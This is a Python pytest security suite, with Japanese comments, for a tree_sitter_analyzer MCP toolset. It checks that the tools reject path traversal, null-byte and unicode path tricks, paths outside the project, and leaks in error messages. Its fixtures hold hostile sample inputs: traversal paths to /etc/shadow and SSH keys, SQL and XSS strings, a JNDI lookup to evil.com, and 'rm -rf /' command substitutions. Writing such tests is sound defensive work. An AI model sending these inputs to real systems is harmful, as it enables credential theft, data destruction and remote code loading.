#!/usr/bin/env python3
"""
MCP Security Tests

セキュリティ実装の包括的監査:
- 入力検証の包括的テスト
- プロジェクト境界保護の検証
- 情報漏洩防止の確認
- セキュリティベストプラクティスの適用確認
"""

import asyncio
import pytest
import tempfile
import os
from pathlib import Path
from typing import Any, Dict

from tree_sitter_analyzer.mcp.tools.analyze_scale_tool import AnalyzeScaleTool
from tree_sitter_analyzer.mcp.tools.table_format_tool import TableFormatTool
from tree_sitter_analyzer.mcp.tools.read_partial_tool import ReadPartialTool
from tree_sitter_analyzer.mcp.tools.query_tool import QueryTool
from tree_sitter_analyzer.mcp.tools.list_files_tool import ListFilesTool
from tree_sitter_analyzer.mcp.tools.search_content_tool import SearchContentTool
from tree_sitter_analyzer.mcp.tools.find_and_grep_tool import FindAndGrepTool
from tree_sitter_analyzer.security.validator import SecurityValidator
from tree_sitter_analyzer.exceptions import SecurityError, ValidationError
from tree_sitter_analyzer.mcp.utils.error_handler import AnalysisError


@pytest.fixture
def security_validator():
    """セキュリティバリデーター"""
    return SecurityValidator()


@pytest.fixture
def safe_project_structure(tmp_path):
    """安全なプロジェクト構造"""
    project_root = tmp_path / "safe_project"
    project_root.mkdir()
    
    # 通常のプロジェクトファイル
    (project_root / "main.py").write_text("print('Hello, World!')")
    (project_root / "config.json").write_text('{"setting": "value"}')
    
    # サブディレクトリ
    sub_dir = project_root / "subdir"
    sub_dir.mkdir()
    (sub_dir / "module.py").write_text("def function(): pass")
    
    return str(project_root)


@pytest.fixture
def malicious_paths():
    """悪意のあるパス例"""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "C:\\Windows\\System32\\config\\SAM",
        "../../.ssh/id_rsa",
        "../.env",
        "../../../../proc/self/environ",
        "file:///etc/passwd",
        "\\\\server\\share\\sensitive.txt",
        "~/.bashrc",
        "$HOME/.ssh/id_rsa",
        "%USERPROFILE%\\Documents\\sensitive.txt"
    ]


class TestInputValidation:
    """入力検証の包括的テスト"""
    
    @pytest.mark.asyncio
    async def test_file_path_validation(self, safe_project_structure, malicious_paths):
        """ファイルパス検証テスト"""
        tool = AnalyzeScaleTool()
        
        for malicious_path in malicious_paths:
            with pytest.raises((SecurityError, ValidationError, FileNotFoundError, ValueError)):
                await tool.execute({
                    "file_path": malicious_path
                })
    
    @pytest.mark.asyncio
    async def test_directory_path_validation(self, safe_project_structure, malicious_paths):
        """ディレクトリパス検証テスト"""
        tool = ListFilesTool()
        
        for malicious_path in malicious_paths:
            try:
                result = await tool.execute({
                    "roots": [malicious_path]
                })
                # ツールがエラー辞書を返す場合をチェック
                if isinstance(result, dict) and not result.get("success", True):
                    continue  # エラーが適切に処理された
                # 例外が発生しなかった場合は失敗
                pytest.fail(f"Expected exception for malicious path: {malicious_path}")
            except (SecurityError, ValidationError, FileNotFoundError, ValueError, AnalysisError):
                continue  # 期待される例外
    
    @pytest.mark.asyncio
    async def test_null_byte_injection(self, safe_project_structure):
        """ヌルバイト注入攻撃の防御テスト"""
        tool = ReadPartialTool()
        
        malicious_paths = [
            "safe_file.py\x00../../etc/passwd",
            "normal.txt\x00..\\..\\.ssh\\id_rsa",
            "file.py\x00/etc/shadow"
        ]
        
        for malicious_path in malicious_paths:
            with pytest.raises((SecurityError, ValidationError, ValueError)):
                await tool.execute({
                    "file_path": malicious_path,
                    "start_line": 1,
                    "end_line": 10
                })
    
    @pytest.mark.asyncio
    async def test_unicode_normalization_attack(self, safe_project_structure):
        """Unicode正規化攻撃の防御テスト"""
        tool = QueryTool()
        
        # Unicode正規化を悪用した攻撃パス
        malicious_paths = [
            "normal.py\u002e\u002e/\u002e\u002e/etc/passwd",
            "file\uff0e\uff0e\uff0f\uff0e\uff0e\uff0fetc\uff0fpasswd",
            "test\u2024\u2024\u2044etc\u2044passwd"
        ]
        
        for malicious_path in malicious_paths:
            try:
                result = await tool.execute({
                    "file_path": malicious_path,
                    "query_key": "methods"
                })
                # 結果がエラーを示している場合は適切にブロックされた
                if isinstance(result, dict) and not result.get("success", True):
                    continue
                # 成功した場合は失敗
                pytest.fail(f"Expected security block for malicious path: {malicious_path}")
            except (SecurityError, ValidationError, FileNotFoundError, ValueError, AnalysisError):
                continue  # 期待される例外
    
    @pytest.mark.asyncio
    async def test_long_path_attack(self, safe_project_structure):
        """長いパス攻撃の防御テスト"""
        tool = TableFormatTool()
        
        # 異常に長いパス
        long_path = "a" * 10000 + ".py"
        
        with pytest.raises((SecurityError, ValidationError, OSError, ValueError)):
            await tool.execute({
                "file_path": long_path
            })
    
    @pytest.mark.asyncio
    async def test_special_character_injection(self, safe_project_structure):
        """特殊文字注入攻撃の防御テスト"""
        tool = SearchContentTool()
        
        malicious_queries = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "$(rm -rf /)",
            "`rm -rf /`",
            "../../etc/passwd && cat /etc/shadow"
        ]
        
        for malicious_query in malicious_queries:
            # 悪意のあるクエリでも安全に処理されることを確認
            result = await tool.execute({
                "roots": [safe_project_structure],
                "query": malicious_query,
                "max_count": 1
            })
            # エラーが発生するか、安全に処理されるかのいずれか
            assert result["success"] is True or "error" in result


class TestProjectBoundaryProtection:
    """プロジェクト境界保護の検証"""
    
    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self, safe_project_structure):
        """パストラバーサル攻撃の防御テスト"""
        tool = ReadPartialTool()
        
        traversal_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "subdir/../../../etc/passwd",
            "subdir\\..\\..\\..\\windows\\system32",
            "./../../etc/passwd",
            ".\\..\\..\\windows\\system32"
        ]
        
        for traversal_path in traversal_paths:
            with pytest.raises((SecurityError, ValidationError, FileNotFoundError, ValueError)):
                await tool.execute({
                    "file_path": traversal_path,
                    "start_line": 1,
                    "end_line": 10
                })
    
    @pytest.mark.asyncio
    async def test_absolute_path_restriction(self, safe_project_structure):
        """絶対パス制限テスト"""
        tool = ListFilesTool()
        
        absolute_paths = [
            "/etc",
            "/usr/bin",
            "/var/log",
            "C:\\Windows",
            "C:\\Program Files",
            "/home/user/.ssh",
            "C:\\Users\\Administrator\\Documents"
        ]
        
        for abs_path in absolute_paths:
            try:
                result = await tool.execute({
                    "roots": [abs_path]
                })
                # 結果がエラーを示している場合は適切にブロックされた
                if isinstance(result, dict) and not result.get("success", True):
                    continue  # 適切にブロックされた
                # 成功した場合は失敗
                pytest.fail(f"Expected security block for absolute path: {abs_path}")
            except (SecurityError, ValidationError, ValueError, AnalysisError):
                continue  # 期待される例外
    
    @pytest.mark.asyncio
    async def test_symlink_traversal_prevention(self, tmp_path):
        """シンボリックリンクトラバーサル防御テスト"""
        # プロジェクトディレクトリ作成
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        
        # 外部ディレクトリ作成
        external_dir = tmp_path / "external"
        external_dir.mkdir()
        (external_dir / "secret.txt").write_text("secret data")
        
        # 悪意のあるシンボリックリンク作成（可能な場合）
        try:
            symlink_path = project_dir / "malicious_link"
            symlink_path.symlink_to(external_dir / "secret.txt")
            
            tool = ReadPartialTool()
            
            try:
                result = await tool.execute({
                    "file_path": str(symlink_path),
                    "start_line": 1,
                    "end_line": 10
                })
                # 結果がエラーを示している場合は適切にブロックされた
                if isinstance(result, dict) and not result.get("success", True):
                    return  # 適切にブロックされた
                # 成功した場合は失敗
                pytest.fail(f"Expected security block for symlink: {symlink_path}")
            except (SecurityError, ValidationError, FileNotFoundError, ValueError):
                return  # 期待される例外
        except OSError:
            # シンボリックリンク作成に失敗した場合はスキップ
            pytest.skip("シンボリックリンク作成に失敗")
    
    @pytest.mark.asyncio
    async def test_project_root_enforcement(self, safe_project_structure):
        """プロジェクトルート強制テスト"""
        tool = FindAndGrepTool()
        
        # プロジェクト外のディレクトリを指定
        external_paths = [
            str(Path(safe_project_structure).parent),
            str(Path(safe_project_structure).parent.parent),
            "/tmp",
            "C:\\Temp"
        ]
        
        for external_path in external_paths:
            if Path(external_path).exists():
                try:
                    result = await tool.execute({
                        "roots": [external_path],
                        "query": "test"
                    })
                    # 結果がエラーを示している場合は適切にブロックされた
                    if isinstance(result, dict) and not result.get("success", True):
                        continue  # 適切にブロックされた
                    # tempディレクトリ内の場合は許可される可能性がある
                    if "temp" in external_path.lower() or "tmp" in external_path.lower():
                        continue  # tempディレクトリは許可される場合がある
                    # 成功した場合は失敗
                    pytest.fail(f"Expected security block for external path: {external_path}")
                except (SecurityError, ValidationError, ValueError, AnalysisError):
                    continue  # 期待される例外


class TestInformationLeakagePrevention:
    """情報漏洩防止の確認"""
    
    @pytest.mark.asyncio
    async def test_error_message_sanitization(self, safe_project_structure):
        """エラーメッセージのサニタイゼーション"""
        tool = AnalyzeScaleTool()
        
        # 絶対パスでエラーを発生させる
        try:
            result = await tool.execute({
                "file_path": "/etc/passwd"
            })
            
            # 結果がエラーを示している場合は適切にブロックされた
            if isinstance(result, dict) and not result.get("success", True):
                error_message = result.get("error", "")
                
                # エラーメッセージに機密情報が含まれていないことを確認
                sensitive_patterns = [
                    "/etc/passwd",
                    "/home/",
                    "/Users/",
                    "C:\\Users\\",
                    "password",
                    "secret",
                    "token",
                    "key"
                ]
                
                for pattern in sensitive_patterns:
                    assert pattern.lower() not in error_message.lower(), f"エラーメッセージに機密情報が含まれている: {pattern}"
            else:
                pytest.fail("Expected security error for absolute path")
        except (SecurityError, ValidationError, ValueError) as e:
            # 例外メッセージも確認
            error_message = str(e)
            assert "/etc/passwd" not in error_message, "例外メッセージに機密パスが含まれている"
    
    @pytest.mark.asyncio
    async def test_stack_trace_filtering(self, safe_project_structure):
        """スタックトレースのフィルタリング"""
        tool = QueryTool()
        
        # 絶対パスでエラーを発生させる
        try:
            result = await tool.execute({
                "file_path": "/etc/passwd",
                "query_string": "invalid_query_syntax"
            })
            
            # 結果がエラーを示している場合は適切にブロックされた
            if isinstance(result, dict) and not result.get("success", True):
                error_info = str(result)
                
                # スタックトレースに機密パスが含まれていないことを確認
                sensitive_paths = [
                    "/etc/passwd",
                    "/home/",
                    "/Users/",
                    "C:\\Users\\",
                    "__pycache__",
                    ".pyc"
                ]
                
                for path in sensitive_paths:
                    assert path not in error_info, f"エラー情報に機密パスが含まれている: {path}"
            else:
                pytest.fail("Expected security error for absolute path")
        except (SecurityError, ValidationError, ValueError, AnalysisError) as e:
            # 例外メッセージも確認
            error_message = str(e)
            assert "/etc/passwd" not in error_message, "例外メッセージに機密パスが含まれている"
    
    @pytest.mark.asyncio
    async def test_file_content_filtering(self, tmp_path):
        """ファイル内容のフィルタリング"""
        # 機密情報を含むファイルを作成
        sensitive_file = tmp_path / "sensitive.py"
        sensitive_content = """
# This file contains sensitive information
API_KEY = "sk-1234567890abcdef"
PASSWORD = "super_secret_password"
DATABASE_URL = "postgresql://user:pass@localhost/db"

def process_data():
    return "normal code"
"""
        sensitive_file.write_text(sensitive_content)
        
        tool = ReadPartialTool()
        result = await tool.execute({
            "file_path": str(sensitive_file),
            "start_line": 1,
            "end_line": 10,
            "format": "text"
        })
        
        # ファイル内容は取得されるが、ログに機密情報が記録されないことを確認
        assert result["success"] is True
        # 実際の機密情報フィルタリングは実装依存


class TestSecurityBestPractices:
    """セキュリティベストプラクティスの適用確認"""
    
    def test_security_validator_initialization(self, security_validator):
        """セキュリティバリデーターの初期化確認"""
        assert security_validator is not None
        assert hasattr(security_validator, 'validate_path')
        assert hasattr(security_validator, 'is_safe_path')
    
    @pytest.mark.asyncio
    async def test_input_sanitization(self, safe_project_structure):
        """入力サニタイゼーションの確認"""
        tool = SearchContentTool()
        
        # 様々な入力パターンをテスト
        test_inputs = [
            "normal_query",
            "query with spaces",
            "query-with-dashes",
            "query_with_underscores",
            "query.with.dots",
            "query123",
            "UPPERCASE_QUERY"
        ]
        
        for test_input in test_inputs:
            result = await tool.execute({
                "roots": [safe_project_structure],
                "query": test_input,
                "max_count": 1
            })
            # 正常な入力は処理される
            assert result["success"] is True
    
    @pytest.mark.asyncio
    async def test_resource_limits(self, safe_project_structure):
        """リソース制限の確認"""
        tool = ListFilesTool()
        
        # 大量のファイル要求
        result = await tool.execute({
            "roots": [safe_project_structure],
            "limit": 100000  # 非常に大きな値
        })
        
        # リソース制限が適用されることを確認
        assert result["success"] is True
        if "count" in result:
            assert result["count"] <= 10000  # 実装で定義された上限
    
    @pytest.mark.asyncio
    async def test_timeout_protection(self, safe_project_structure):
        """タイムアウト保護の確認"""
        tool = SearchContentTool()
        
        # 複雑な正規表現でタイムアウトをテスト
        complex_regex = r"(a+)+b"  # 潜在的にバックトラッキングを引き起こす
        
        result = await tool.execute({
            "roots": [safe_project_structure],
            "query": complex_regex,
            "timeout_ms": 1000,  # 1秒のタイムアウト
            "max_count": 1
        })
        
        # タイムアウトまたは安全な処理が行われることを確認
        assert result["success"] is True or "timeout" in str(result).lower()
    
    @pytest.mark.asyncio
    async def test_concurrent_request_handling(self, safe_project_structure):
        """同時リクエスト処理の確認"""
        tool = AnalyzeScaleTool()
        
        # 複数の同時リクエストを作成
        tasks = []
        for i in range(5):
            task = tool.execute({
                "file_path": str(Path(safe_project_structure) / "main.py")
            })
            tasks.append(task)
        
        # 全てのタスクを並行実行
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # 全てのリクエストが適切に処理されることを確認
        for result in results:
            assert not isinstance(result, Exception) or isinstance(result, (SecurityError, ValidationError))
            if isinstance(result, dict):
                assert result["success"] is True


class TestSecurityConfiguration:
    """セキュリティ設定の確認"""
    
    def test_default_security_settings(self, security_validator):
        """デフォルトセキュリティ設定の確認"""
        # セキュリティバリデーターがデフォルトで安全な設定になっていることを確認
        assert security_validator is not None
        
        # 危険なパスが拒否されることを確認
        dangerous_paths = [
            "/etc/passwd",
            "C:\\Windows\\System32",
            "../../../etc/shadow"
        ]
        
        for path in dangerous_paths:
            assert not security_validator.is_safe_path(path), f"危険なパスが許可されている: {path}"
    
    def test_security_headers_and_metadata(self):
        """セキュリティヘッダーとメタデータの確認"""
        # MCPツールがセキュリティメタデータを適切に設定していることを確認
        tool = AnalyzeScaleTool()
        
        # ツールの基本的な属性を確認
        assert hasattr(tool, '__class__')
        assert tool.__class__.__name__ == 'AnalyzeScaleTool'
        
        # セキュリティ関連の設定が存在することを確認
        # 実装依存の詳細は省略


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])